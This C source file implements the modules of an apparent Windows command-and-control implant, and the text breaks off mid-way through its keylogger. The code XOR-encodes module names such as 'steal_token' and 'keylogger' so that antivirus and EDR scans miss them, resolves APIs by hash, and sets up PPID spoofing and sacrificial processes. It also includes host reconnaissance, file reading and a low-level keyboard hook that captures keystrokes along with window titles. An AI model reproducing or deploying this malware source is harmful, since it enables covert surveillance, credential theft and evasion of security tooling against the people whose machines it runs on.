/*
 * modules.c — System info collection and native module implementations.
 * All operations use Win32 API directly — no child processes spawned
 * (except shell/powershell which intentionally spawn cmd.exe/powershell.exe).
 *
 * Modules: whoami, ps, ls, cat, upload, download, shell, powershell
 */
#include "agent.h"
#include "api_resolve.h"

/* Helper: buf_append a string literal with auto-length */
#define BUF_STR(buf, s) buf_append(buf, s, (DWORD)(sizeof(s) - 1))

/* ─── Encrypted module name comparison ───
 * Module names are XOR'd at compile time with CONFIG_XOR_KEY (randomized per
 * build). This prevents strings like "whoami", "steal_token", "rev2self" from
 * appearing in the binary, which are strong AV/EDR static signatures.
 */
static inline BOOL _mod_eq(const char *name, const unsigned char *enc, int len) {
    for (int i = 0; i < len; i++) {
        if (name[i] != (char)(enc[i] ^ CONFIG_XOR_KEY)) return FALSE;
    }
    return name[len] == '\0';
}

#define _K CONFIG_XOR_KEY
static const unsigned char _mn_whoami[]      = {'w'^_K,'h'^_K,'o'^_K,'a'^_K,'m'^_K,'i'^_K};
static const unsigned char _mn_ps[]          = {'p'^_K,'s'^_K};
static const unsigned char _mn_ls[]          = {'l'^_K,'s'^_K};
static const unsigned char _mn_cd[]          = {'c'^_K,'d'^_K};
static const unsigned char _mn_cat[]         = {'c'^_K,'a'^_K,'t'^_K};
static const unsigned char _mn_upload[]      = {'u'^_K,'p'^_K,'l'^_K,'o'^_K,'a'^_K,'d'^_K};
static const unsigned char _mn_download[]    = {'d'^_K,'o'^_K,'w'^_K,'n'^_K,'l'^_K,'o'^_K,'a'^_K,'d'^_K};
static const unsigned char _mn_shell[]       = {'s'^_K,'h'^_K,'e'^_K,'l'^_K,'l'^_K};
static const unsigned char _mn_powershell[]  = {'p'^_K,'o'^_K,'w'^_K,'e'^_K,'r'^_K,'s'^_K,'h'^_K,'e'^_K,'l'^_K,'l'^_K};
static const unsigned char _mn_steal_token[] = {'s'^_K,'t'^_K,'e'^_K,'a'^_K,'l'^_K,'_'^_K,'t'^_K,'o'^_K,'k'^_K,'e'^_K,'n'^_K};
static const unsigned char _mn_rev2self[]    = {'r'^_K,'e'^_K,'v'^_K,'2'^_K,'s'^_K,'e'^_K,'l'^_K,'f'^_K};
static const unsigned char _mn_systeminfo[]  = {'s'^_K,'y'^_K,'s'^_K,'t'^_K,'e'^_K,'m'^_K,'i'^_K,'n'^_K,'f'^_K,'o'^_K};
static const unsigned char _mn_keylogger[]   = {'k'^_K,'e'^_K,'y'^_K,'l'^_K,'o'^_K,'g'^_K,'g'^_K,'e'^_K,'r'^_K};
static const unsigned char _mn_jump[]        = {'j'^_K,'u'^_K,'m'^_K,'p'^_K};
static const unsigned char _mn_link[]        = {'l'^_K,'i'^_K,'n'^_K,'k'^_K};
static const unsigned char _mn_unlink[]      = {'u'^_K,'n'^_K,'l'^_K,'i'^_K,'n'^_K,'k'^_K};
static const unsigned char _mn_spawnto[]     = {'s'^_K,'p'^_K,'a'^_K,'w'^_K,'n'^_K,'t'^_K,'o'^_K};
static const unsigned char _mn_ppid[]        = {'p'^_K,'p'^_K,'i'^_K,'d'^_K};
static const unsigned char _mn_spawn[]       = {'s'^_K,'p'^_K,'a'^_K,'w'^_K,'n'^_K};
#undef _K

/* ─── Spawn configuration (used by spawnto, ppid, future spawn command) ───
 * These globals store the sacrificial process path and parent PID that
 * fork-and-run post-exploitation jobs will use.
 */
static char _spawnto_x64[MAX_PATH] = "%windir%\\System32\\rundll32.exe";
static char _spawnto_x86[MAX_PATH] = "%windir%\\SysWOW64\\rundll32.exe";
static DWORD _spawn_ppid = 0;  /* 0 = inherit from agent (no PPID spoofing) */

/* ─── Argument parsing helpers (BeaconDataParse-compatible) ─── */

typedef struct {
    const unsigned char *data;
    DWORD offset;
    DWORD length;
} ArgParser;

static void arg_parse_init(ArgParser *p, const unsigned char *data, DWORD len) {
    p->data = data;
    p->offset = 0;
    p->length = len;
}

static const char *arg_extract_str(ArgParser *p) {
    if (p->offset + 4 > p->length) return "";
    DWORD slen;
    memcpy(&slen, p->data + p->offset, 4);
    p->offset += 4;
    if (p->offset + slen > p->length) return "";
    const char *str = (const char *)(p->data + p->offset);
    p->offset += slen;
    return str;
}

static int arg_extract_int(ArgParser *p) {
    if (p->offset + 4 > p->length) return 0;
    int val;
    memcpy(&val, p->data + p->offset, 4);
    p->offset += 4;
    return val;
}

static const unsigned char *arg_extract_bin(ArgParser *p, DWORD *out_len) {
    if (p->offset + 4 > p->length) { *out_len = 0; return NULL; }
    DWORD blen;
    memcpy(&blen, p->data + p->offset, 4);
    p->offset += 4;
    if (p->offset + blen > p->length) { *out_len = 0; return NULL; }
    const unsigned char *ptr = p->data + p->offset;
    p->offset += blen;
    *out_len = blen;
    return ptr;
}

/* ─── System info collection ─── */

void sysinfo_collect(Buffer *tlv_out) {
    char buf[512];

    /* Hostname */
    DWORD size = sizeof(buf);
    if (GetComputerNameA(buf, &size))
        tlv_add_string(tlv_out, TLV_HOSTNAME, buf);

    /* Username (DOMAIN\user) — use thread token if impersonating */
    HANDLE hToken;
    BOOL gotToken = OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken);
    if (!gotToken)
        gotToken = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
    if (gotToken) {
        DWORD token_len = 0;
        unsigned char *token_buf = NULL;
        GetTokenInformation(hToken, TokenUser, NULL, 0, &token_len);
        if (token_len > 0 && (token_buf = (unsigned char *)malloc(token_len)) != NULL) {
            if (GetTokenInformation(hToken, TokenUser, token_buf, token_len, &token_len)) {
                TOKEN_USER *tu = (TOKEN_USER *)token_buf;
                char name[128] = {0}, domain[128] = {0};
                DWORD name_len = sizeof(name), domain_len = sizeof(domain);
                SID_NAME_USE snu;
                if (LookupAccountSidA(NULL, tu->User.Sid, name, &name_len,
                                      domain, &domain_len, &snu)) {
                    snprintf(buf, sizeof(buf), "%s\\%s", domain, name);
                    tlv_add_string(tlv_out, TLV_USERNAME, buf);
                }
            }
            free(token_buf);
        }

        /* Integrity level */
        token_len = 0;
        token_buf = NULL;
        GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &token_len);
        if (token_len > 0 && (token_buf = (unsigned char *)malloc(token_len)) != NULL &&
            GetTokenInformation(hToken, TokenIntegrityLevel, token_buf, token_len, &token_len)) {
            TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL *)token_buf;
            DWORD *sub = GetSidSubAuthority(tml->Label.Sid,
                         *GetSidSubAuthorityCount(tml->Label.Sid) - 1);
            BYTE level = INTEGRITY_MEDIUM;
            if (*sub >= 0x4000) level = INTEGRITY_SYSTEM;
            else if (*sub >= 0x3000) level = INTEGRITY_HIGH;
            else if (*sub >= 0x2000) level = INTEGRITY_MEDIUM;
            else level = INTEGRITY_LOW;
            tlv_add_uint8(tlv_out, TLV_INTEGRITY, level);

            /* Is admin? */
            BOOL is_admin = FALSE;
            SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
            PSID adminSid;
            if (AllocateAndInitializeSid(&ntAuth, 2,
                    SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
                    0, 0, 0, 0, 0, 0, &adminSid)) {
                CheckTokenMembership(NULL, adminSid, &is_admin);
                FreeSid(adminSid);
            }
            tlv_add_uint8(tlv_out, TLV_IS_ADMIN, is_admin ? 1 : 0);
        }
        free(token_buf);
        CloseHandle(hToken);
    }

    /* PID */
    tlv_add_uint32(tlv_out, TLV_PID, GetCurrentProcessId());

    /* Architecture */
#ifdef _WIN64
    tlv_add_uint8(tlv_out, TLV_ARCH, ARCH_X64);
#else
    BOOL isWow64 = FALSE;
    IsWow64Process(GetCurrentProcess(), &isWow64);
    tlv_add_uint8(tlv_out, TLV_ARCH, isWow64 ? ARCH_X64 : ARCH_X86);
#endif

    /* OS version from registry */
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char product[256] = {0}, build[64] = {0};
        DWORD psize = sizeof(product), bsize = sizeof(build);
        RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)product, &psize);
        RegQueryValueExA(hKey, "CurrentBuildNumber", NULL, NULL, (LPBYTE)build, &bsize);
        snprintf(buf, sizeof(buf), "%s Build %s", product, build);
        tlv_add_string(tlv_out, TLV_OS_VERSION, buf);
        RegCloseKey(hKey);
    }

    /* Process name */
    char proc_name[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, proc_name, MAX_PATH);
    char *slash = strrchr(proc_name, '\\');
    tlv_add_string(tlv_out, TLV_PROCESS_NAME, slash ? slash + 1 : proc_name);

    /* Runtime (C agent, no .NET) */
    tlv_add_string(tlv_out, TLV_DOTNET_VERSION, "native-c");
    char agent_ver_dec[32];
    DECRYPT_CONFIG(agent_ver_dec, AGENT_VER);
    tlv_add_string(tlv_out, TLV_AGENT_VERSION, agent_ver_dec);
    SecureZeroMemory(agent_ver_dec, sizeof(agent_ver_dec));

    /* CWD */
    char cwd[MAX_PATH] = {0};
    GetCurrentDirectoryA(MAX_PATH, cwd);
    tlv_add_string(tlv_out, TLV_CWD, cwd);
}

/* ─── Module: whoami ─── */

/* Helper: map SID_NAME_USE enum to display string */
static const char *sid_type_str(SID_NAME_USE snu) {
    switch (snu) {
        case SidTypeUser:           return "User";
        case SidTypeGroup:          return "Group";
        case SidTypeDomain:         return "Domain";
        case SidTypeAlias:          return "Alias";
        case SidTypeWellKnownGroup: return "Well-known group";
        case SidTypeDeletedAccount: return "Deleted account";
        case SidTypeInvalid:        return "Invalid";
        case SidTypeComputer:       return "Computer";
        case SidTypeLabel:          return "Label";
        default:                    return "Unknown";
    }
}

/* Helper: decode group attributes bitmask to readable string */
static void group_attrs_str(DWORD attrs, char *buf, DWORD buf_size) {
    buf[0] = '\0';
    if (attrs & SE_GROUP_MANDATORY)
        strncat(buf, "Mandatory group, ", buf_size - strlen(buf) - 1);
    if (attrs & SE_GROUP_ENABLED_BY_DEFAULT)
        strncat(buf, "Enabled by default, ", buf_size - strlen(buf) - 1);
    if (attrs & SE_GROUP_ENABLED)
        strncat(buf, "Enabled group, ", buf_size - strlen(buf) - 1);
    if (attrs & SE_GROUP_OWNER)
        strncat(buf, "Group owner, ", buf_size - strlen(buf) - 1);
    if (attrs & SE_GROUP_USE_FOR_DENY_ONLY)
        strncat(buf, "Deny only, ", buf_size - strlen(buf) - 1);
    if (attrs & SE_GROUP_INTEGRITY)
        strncat(buf, "Integrity, ", buf_size - strlen(buf) - 1);
    if (attrs & SE_GROUP_LOGON_ID)
        strncat(buf, "Logon ID, ", buf_size - strlen(buf) - 1);
    /* Trim trailing ", " */
    size_t len = strlen(buf);
    if (len >= 2 && buf[len - 2] == ',')
        buf[len - 2] = '\0';
}

void mod_whoami(Buffer *out) {
    char line[1024];
    HANDLE hToken;

    /* Try thread token first (set by ImpersonateLoggedOnUser / getsystem BOF),
       fall back to process token if no impersonation is active */
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken)) {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            BUF_STR(out, "Failed to open token\n");
            return;
        }
    }

    /* ── USER INFORMATION ── */
    DWORD token_len = 0;
    unsigned char *token_buf = NULL;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &token_len);
    if (token_len > 0 && (token_buf = (unsigned char *)malloc(token_len)) != NULL) {
        if (GetTokenInformation(hToken, TokenUser, token_buf, token_len, &token_len)) {
            TOKEN_USER *tu = (TOKEN_USER *)token_buf;

            char name[256] = {0}, domain[256] = {0};
            DWORD name_len = sizeof(name), domain_len = sizeof(domain);
            SID_NAME_USE snu;
            LookupAccountSidA(NULL, tu->User.Sid, name, &name_len, domain, &domain_len, &snu);

            char *sid_str = NULL;
            ConvertSidToStringSidA(tu->User.Sid, &sid_str);

            char fullname[512];
            snprintf(fullname, sizeof(fullname), "%s\\%s", domain, name);

            BUF_STR(out, "\nUSER INFORMATION\n");
            BUF_STR(out, "----------------\n");
            snprintf(line, sizeof(line), "%-45s %s\n", "User Name", "SID");
            buf_append(out, line, (DWORD)strlen(line));
            snprintf(line, sizeof(line), "%-45s %s\n",
                     "=============================================",
                     "============================================");
            buf_append(out, line, (DWORD)strlen(line));
            snprintf(line, sizeof(line), "%-45s %s\n", fullname, sid_str ? sid_str : "?");
            buf_append(out, line, (DWORD)strlen(line));
            if (sid_str) LocalFree(sid_str);
        }
        free(token_buf);
    }

    /* ── GROUP INFORMATION ── */
    token_len = 0;
    token_buf = NULL;
    GetTokenInformation(hToken, TokenGroups, NULL, 0, &token_len);
    if (token_len == 0) goto skip_groups;
    token_buf = (unsigned char *)malloc(token_len);
    if (!token_buf) goto skip_groups;
    if (GetTokenInformation(hToken, TokenGroups, token_buf, token_len, &token_len)) {
        TOKEN_GROUPS *tg = (TOKEN_GROUPS *)token_buf;

        BUF_STR(out, "\nGROUP INFORMATION\n");
        BUF_STR(out, "-----------------\n");
        snprintf(line, sizeof(line), "%-50s %-18s %-50s %s\n",
                 "Group Name", "Type", "SID", "Attributes");
        buf_append(out, line, (DWORD)strlen(line));
        snprintf(line, sizeof(line), "%-50s %-18s %-50s %s\n",
                 "==================================================",
                 "==================",
                 "==================================================",
                 "==============================");
        buf_append(out, line, (DWORD)strlen(line));

        for (DWORD i = 0; i < tg->GroupCount; i++) {
            char gname[256] = {0}, gdomain[256] = {0};
            DWORD gn_len = sizeof(gname), gd_len = sizeof(gdomain);
            SID_NAME_USE gsnu;
            char gfull[512] = {0};
            char *gsid_str = NULL;
            char attr_buf[512] = {0};

            if (LookupAccountSidA(NULL, tg->Groups[i].Sid, gname, &gn_len,
                                  gdomain, &gd_len, &gsnu)) {
                if (gdomain[0])
                    snprintf(gfull, sizeof(gfull), "%s\\%s", gdomain, gname);
                else
                    snprintf(gfull, sizeof(gfull), "%s", gname);
            } else {
                snprintf(gfull, sizeof(gfull), "(unknown)");
                gsnu = SidTypeUnknown;
            }

            ConvertSidToStringSidA(tg->Groups[i].Sid, &gsid_str);
            group_attrs_str(tg->Groups[i].Attributes, attr_buf, sizeof(attr_buf));

            snprintf(line, sizeof(line), "%-50s %-18s %-50s %s\n",
                     gfull, sid_type_str(gsnu),
                     gsid_str ? gsid_str : "?", attr_buf);
            buf_append(out, line, (DWORD)strlen(line));
            if (gsid_str) LocalFree(gsid_str);
        }
    }
    free(token_buf);
skip_groups:

    /* ── PRIVILEGES INFORMATION ── */
    token_len = 0;
    token_buf = NULL;
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &token_len);
    if (token_len > 0 && (token_buf = (unsigned char *)malloc(token_len)) != NULL) {
        if (GetTokenInformation(hToken, TokenPrivileges, token_buf, token_len, &token_len)) {
            TOKEN_PRIVILEGES *tp = (TOKEN_PRIVILEGES *)token_buf;

            BUF_STR(out, "\nPRIVILEGES INFORMATION\n");
            BUF_STR(out, "----------------------\n");
            snprintf(line, sizeof(line), "%-42s %-52s %s\n",
                     "Privilege Name", "Description", "State");
            buf_append(out, line, (DWORD)strlen(line));
            snprintf(line, sizeof(line), "%-42s %-52s %s\n",
                     "==========================================",
                     "====================================================",
                     "=============");
            buf_append(out, line, (DWORD)strlen(line));

            for (DWORD i = 0; i < tp->PrivilegeCount; i++) {
                char priv_name[128] = {0};
                DWORD pn_len = sizeof(priv_name);
                LookupPrivilegeNameA(NULL, &tp->Privileges[i].Luid, priv_name, &pn_len);

                /* Get human-readable description via LookupPrivilegeDisplayNameA */
                char priv_desc[256] = {0};
                DWORD pd_len = sizeof(priv_desc);
                DWORD lang_id = 0;
                if (!LookupPrivilegeDisplayNameA(NULL, priv_name, priv_desc, &pd_len, &lang_id))
                    strncpy(priv_desc, "(no description)", sizeof(priv_desc) - 1);

                const char *status = (tp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)
                                     ? "Enabled" : "Disabled";
                snprintf(line, sizeof(line), "%-42s %-52s %s\n", priv_name, priv_desc, status);
                buf_append(out, line, (DWORD)strlen(line));
            }
        }
        free(token_buf);
    }

    /* ── INTEGRITY LEVEL ── */
    token_len = 0;
    token_buf = NULL;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &token_len);
    if (token_len > 0 && (token_buf = (unsigned char *)malloc(token_len)) != NULL) {
        if (GetTokenInformation(hToken, TokenIntegrityLevel, token_buf, token_len, &token_len)) {
            TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL *)token_buf;
            DWORD *sub = GetSidSubAuthority(tml->Label.Sid,
                         *GetSidSubAuthorityCount(tml->Label.Sid) - 1);
            const char *level = "Medium Mandatory Level";
            if (*sub >= 0x4000) level = "System Mandatory Level";
            else if (*sub >= 0x3000) level = "High Mandatory Level";
            else if (*sub < 0x2000) level = "Low Mandatory Level";

            char *int_sid = NULL;
            ConvertSidToStringSidA(tml->Label.Sid, &int_sid);
            snprintf(line, sizeof(line), "\nIntegrity: %s (%s)\n",
                     level, int_sid ? int_sid : "?");
            buf_append(out, line, (DWORD)strlen(line));
            if (int_sid) LocalFree(int_sid);
        }
        free(token_buf);
    }

    CloseHandle(hToken);
}

/* ─── Module: ps (process list) ─── */

void mod_ps(Buffer *out) {
    char line[512];

    /*
     * Use NtQuerySystemInformation(SystemProcessInformation) instead of
     * CreateToolhelp32Snapshot. Advantages:
     *   - Single syscall, no per-process OpenProcess
     *   - Gives PPID and session ID directly
     *   - We only call OpenProcessToken for the owner column
     */
    typedef LONG (NTAPI *pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
    pNtQuerySystemInformation NtQSI = (pNtQuerySystemInformation)
        api_resolve(HASH_NTDLL, HASH_NtQuerySystemInformation);
    if (!NtQSI) {
        buf_append(out, "[!] Failed to resolve API\n", 26);
        return;
    }

    ULONG buf_size = 1024 * 1024;
    unsigned char *buffer = (unsigned char *)VirtualAlloc(NULL, buf_size,
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) { buf_append(out, "[!] VirtualAlloc failed\n", 24); return; }

    ULONG ret_len = 0;
    LONG status;
    while ((status = NtQSI(5 /* SystemProcessInformation */, buffer, buf_size, &ret_len))
            == (LONG)0xC0000004L) { /* STATUS_INFO_LENGTH_MISMATCH */
        VirtualFree(buffer, 0, MEM_RELEASE);
        buf_size = ret_len + 4096;
        buffer = (unsigned char *)VirtualAlloc(NULL, buf_size,
                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) { buf_append(out, "[!] VirtualAlloc failed\n", 24); return; }
    }
    if (status != 0) {
        snprintf(line, sizeof(line), "[!] SysInfo query failed: 0x%08lx\n", (unsigned long)status);
        buf_append(out, line, (DWORD)strlen(line));
        VirtualFree(buffer, 0, MEM_RELEASE);
        return;
    }

    snprintf(line, sizeof(line), "%-7s %-7s %-4s %-28s %s\n",
             "PID", "PPID", "SID", "USER", "NAME");
    buf_append(out, line, (DWORD)strlen(line));
    buf_append(out, "─────── ─────── ──── ──────────────────────────── ────────────────────────────\n", 79);

    unsigned char *current = buffer;
    while (1) {
        DWORD next_offset = *(DWORD *)(current + 0x00);
        ULONG_PTR pid_raw = *(ULONG_PTR *)(current + 0x50);
        ULONG_PTR ppid_raw = *(ULONG_PTR *)(current + 0x58);
        DWORD pid  = (DWORD)pid_raw;
        DWORD ppid = (DWORD)ppid_raw;
        DWORD sid  = *(DWORD *)(current + 0x64); /* SessionId offset for x64 */

        /* Process name from UNICODE_STRING at offset 0x38 */
        USHORT name_len = *(USHORT *)(current + 0x38);
        wchar_t *name_buf = *(wchar_t **)(current + 0x38 + sizeof(ULONG_PTR));
        char proc_name[128] = "[System]";
        if (name_len > 0 && name_buf) {
            int conv = WideCharToMultiByte(CP_UTF8, 0, name_buf, name_len / 2,
                                           proc_name, 127, NULL, NULL);
            if (conv > 0) proc_name[conv] = '\0';
        }

        /* Resolve process owner via token */
        char user_str[128] = "";
        if (pid != 0) {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
            if (!hProc)
                hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
            if (hProc) {
                HANDLE hToken = NULL;
                if (OpenProcessToken(hProc, TOKEN_QUERY, &hToken)) {
                    DWORD tlen = 0;
                    GetTokenInformation(hToken, TokenUser, NULL, 0, &tlen);
                    if (tlen > 0) {
                        unsigned char *tbuf = (unsigned char *)malloc(tlen);
                        if (tbuf) {
                            if (GetTokenInformation(hToken, TokenUser, tbuf, tlen, &tlen)) {
                                TOKEN_USER *tu = (TOKEN_USER *)tbuf;
                                char uname[64] = {0}, domain[64] = {0};
                                DWORD uname_len = sizeof(uname), domain_len = sizeof(domain);
                                SID_NAME_USE snu;
                                if (LookupAccountSidA(NULL, tu->User.Sid, uname, &uname_len,
                                                      domain, &domain_len, &snu)) {
                                    snprintf(user_str, sizeof(user_str), "%s\\%s", domain, uname);
                                }
                            }
                            free(tbuf);
                        }
                    }
                    CloseHandle(hToken);
                }
                CloseHandle(hProc);
            }
        }

        snprintf(line, sizeof(line), "%-7lu %-7lu %-4lu %-28s %s\n",
                 (unsigned long)pid, (unsigned long)ppid,
                 (unsigned long)sid, user_str, proc_name);
        buf_append(out, line, (DWORD)strlen(line));

        if (next_offset == 0) break;
        current += next_offset;
    }

    VirtualFree(buffer, 0, MEM_RELEASE);
}

/* ─── Module: ls (directory listing) ─── */

void mod_ls(Buffer *out, const char *path) {
    char search[MAX_PATH];
    char abs_dir[MAX_PATH];
    char line[1024];

    if (!path || strlen(path) == 0) {
        GetCurrentDirectoryA(MAX_PATH, abs_dir);
    } else {
        /* Resolve to absolute path */
        if (!GetFullPathNameA(path, MAX_PATH, abs_dir, NULL)) {
            strncpy(abs_dir, path, MAX_PATH - 1);
            abs_dir[MAX_PATH - 1] = '\0';
        }
    }

    /* Build search pattern: abs_dir\* */
    strncpy(search, abs_dir, MAX_PATH - 3);
    search[MAX_PATH - 3] = '\0';
    size_t slen = strlen(search);
    if (slen > 0 && search[slen - 1] != '\\') strcat(search, "\\");
    strcat(search, "*");

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        snprintf(line, sizeof(line), "Error listing: %s (err=%lu)\n",
                 abs_dir, GetLastError());
        buf_append(out, line, (DWORD)strlen(line));
        return;
    }

    /* Header — Merlin format */
    snprintf(line, sizeof(line), "Directory listing for: %s\r\n\r\n", abs_dir);
    buf_append(out, line, (DWORD)strlen(line));

    do {
        /* ── Permissions string (Unix-style from Windows attrs) ── */
        int is_dir  = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
        int is_ro   = (fd.dwFileAttributes & FILE_ATTRIBUTE_READONLY)  != 0;
        char perms[11];
        /*  d rwx rwx rwx  or  - rw- rw- rw-  (Go's os.FileMode on Windows) */
        perms[0] = is_dir ? 'd' : '-';
        perms[1] = 'r';
        perms[2] = is_ro  ? '-' : 'w';
        perms[3] = is_dir ? 'x' : '-';
        perms[4] = 'r';
        perms[5] = is_ro  ? '-' : 'w';
        perms[6] = is_dir ? 'x' : '-';
        perms[7] = 'r';
        perms[8] = is_ro  ? '-' : 'w';
        perms[9] = is_dir ? 'x' : '-';
        perms[10] = '\0';

        /* ── Modified time ── */
        SYSTEMTIME st;
        FileTimeToSystemTime(&fd.ftLastWriteTime, &st);
        char timestr[32];
        snprintf(timestr, sizeof(timestr), "%04d-%02d-%02d %02d:%02d:%02d",
                 st.wYear, st.wMonth, st.wDay,
                 st.wHour, st.wMinute, st.wSecond);

        /* ── Size ── */
        ULONGLONG fsize = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;

        /* ── Output: perms \t modified \t size \t name ── */
        snprintf(line, sizeof(line), "%s\t%s\t%llu\t%s\n",
                 perms, timestr, fsize, fd.cFileName);
        buf_append(out, line, (DWORD)strlen(line));
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
}

/* ─── Module: cd (change directory) ─── */

void mod_cd(Buffer *out, const char *path) {
    if (!path || strlen(path) == 0) {
        /* No argument — print current working directory (like pwd) */
        char cwd[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, cwd);
        char line[MAX_PATH + 32];
        snprintf(line, sizeof(line), "Current working directory: %s", cwd);
        buf_append(out, line, (DWORD)strlen(line));
        return;
    }

    if (!SetCurrentDirectoryA(path)) {
        char err[512];
        snprintf(err, sizeof(err),
                 "there was an error changing directories when executing the 'cd' command:\r\n"
                 "SetCurrentDirectoryA failed for '%s' (err=%lu)", path, GetLastError());
        buf_append(out, err, (DWORD)strlen(err));
        return;
    }

    /* Return Merlin-style confirmation + new absolute CWD */
    char cwd[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, cwd);
    char line[MAX_PATH + 48];
    snprintf(line, sizeof(line), "Changed working directory to %s", cwd);
    buf_append(out, line, (DWORD)strlen(line));
}

/* ─── Module: cat (read file) ─── */

void mod_cat(Buffer *out, const char *path) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char err[256];
        snprintf(err, sizeof(err), "Cannot open: %s (err=%lu)\n", path, GetLastError());
        buf_append(out, err, (DWORD)strlen(err));
        return;
    }

    DWORD fsize = GetFileSize(hFile, NULL);
    if (fsize > 10 * 1024 * 1024) { /* 10MB limit */
        buf_append(out, "File too large (>10MB)\n", 22);
        CloseHandle(hFile);
        return;
    }

    unsigned char *fbuf = (unsigned char *)malloc(fsize);
    DWORD bytes_read;
    if (ReadFile(hFile, fbuf, fsize, &bytes_read, NULL)) {
        buf_append(out, fbuf, bytes_read);
    }
    free(fbuf);
    CloseHandle(hFile);
}

/* ─── Module: keylogger (in-memory keystroke capture) ─── */

/* Persistent state — survives across task invocations */
static HHOOK            _kl_hook       = NULL;
static HANDLE           _kl_thread     = NULL;
static DWORD            _kl_thread_id  = 0;
static Buffer           _kl_buf        = {NULL, 0, 0};
static volatile LONG    _kl_active     = 0;
static char             _kl_last_wnd[256] = {0};
static CRITICAL_SECTION _kl_cs;
static int              _kl_cs_init    = 0;

/* Dynamically resolved user32 pointers (set once on start) */
typedef HHOOK   (WINAPI *_kl_fn_SetHook)(int, HOOKPROC, HINSTANCE, DWORD);
typedef BOOL    (WINAPI *_kl_fn_Unhook)(HHOOK);
typedef LRESULT (WINAPI *_kl_fn_CallNext)(HHOOK, int, WPARAM, LPARAM);
typedef BOOL    (WINAPI *_kl_fn_GetMsg)(LPMSG, HWND, UINT, UINT);
typedef HWND    (WINAPI *_kl_fn_GetFgWnd)(void);
typedef int     (WINAPI *_kl_fn_GetWndTxt)(HWND, LPSTR, int);
typedef SHORT   (WINAPI *_kl_fn_GetKeyState)(int);
typedef BOOL    (WINAPI *_kl_fn_PostThrdMsg)(DWORD, UINT, WPARAM, LPARAM);
typedef HMODULE (WINAPI *_kl_fn_GetModHandle)(LPCSTR);

static _kl_fn_CallNext    _klCallNext   = NULL;
static _kl_fn_GetFgWnd    _klGetFgWnd   = NULL;
static _kl_fn_GetWndTxt   _klGetWndTxt  = NULL;
static _kl_fn_GetKeyState _klGetKS      = NULL;
static volatile DWORD     _kl_last_error = 0;

/* Hook callback — runs in the hook thread context */
static LRESULT CALLBACK _kl_hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == 0x0100 /*WM_KEYDOWN*/ || wParam == 0x0104 /*WM_SYSKEYDOWN*/)) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vk = kb->vkCode;

        /* Foreground window title */
        char wt[256] = {0};
        HWND fg = _klGetFgWnd();
        if (fg) _klGetWndTxt(fg, wt, sizeof(wt));

        EnterCriticalSection(&_kl_cs);

        /* Window changed — emit header */
        if (strcmp(wt, _kl_last_wnd) != 0) {
            strncpy(_kl_last_wnd, wt, sizeof(_kl_last_wnd) - 1);
            char hdr[320];
            snprintf(hdr, sizeof(hdr), "\r\n[%s]\r\n", wt[0] ? wt : "(untitled)");
            buf_append(&_kl_buf, hdr, (DWORD)strlen(hdr));
        }

        int shift = (_klGetKS(0x10) & 0x8000) != 0;   /* VK_SHIFT   */
        int caps  = (_klGetKS(0x14) & 0x0001) != 0;    /* VK_CAPITAL */
        char out[16] = {0};

        if (vk >= 0x41 && vk <= 0x5A) {                /* A-Z */
            out[0] = (shift ^ caps) ? (char)vk : (char)(vk + 32);
        } else if (vk >= 0x30 && vk <= 0x39) {         /* 0-9 */
            if (shift) { const char *s = ")!@#$%^&*("; out[0] = s[vk - 0x30]; }
            else out[0] = (char)vk;
        } else if (vk >= 0x60 && vk <= 0x69) {         /* Numpad 0-9 */
            out[0] = (char)('0' + (vk - 0x60));
        } else {
            switch (vk) {
                case 0x0D: strncpy(out, "\r\n", 3); break;
                case 0x20: out[0] = ' '; break;
                case 0x09: strncpy(out, "[TAB]", 6); break;
                case 0x08: strncpy(out, "[BS]", 5); break;
                case 0x1B: strncpy(out, "[ESC]", 6); break;
                case 0x2E: strncpy(out, "[DEL]", 6); break;
                case 0xBA: out[0] = shift ? ':' : ';'; break;
                case 0xBB: out[0] = shift ? '+' : '='; break;
                case 0xBC: out[0] = shift ? '<' : ','; break;
                case 0xBD: out[0] = shift ? '_' : '-'; break;
                case 0xBE: out[0] = shift ? '>' : '.'; break;
                case 0xBF: out[0] = shift ? '?' : '/'; break;
                case 0xC0: out[0] = shift ? '~' : '`'; break;
                case 0xDB: out[0] = shift ? '{' : '['; break;
